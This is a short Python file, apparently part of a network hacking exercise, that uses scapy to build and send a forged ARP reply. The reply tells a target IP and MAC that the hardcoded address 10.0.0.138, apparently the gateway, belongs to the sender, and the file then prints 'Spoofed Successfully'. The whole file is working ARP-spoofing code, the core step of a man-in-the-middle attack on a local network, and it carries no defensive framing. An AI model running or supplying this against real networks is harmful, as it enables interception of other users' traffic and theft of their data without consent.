import scapy.all as scapy


def Spoofer(des_ip, des_mac):
    packet = scapy.ARP(op=2, pdst=des_ip, hwdst=des_mac, psrc="10.0.0.138")
    scapy.send(packet)
    print("Spoofed Successfully")
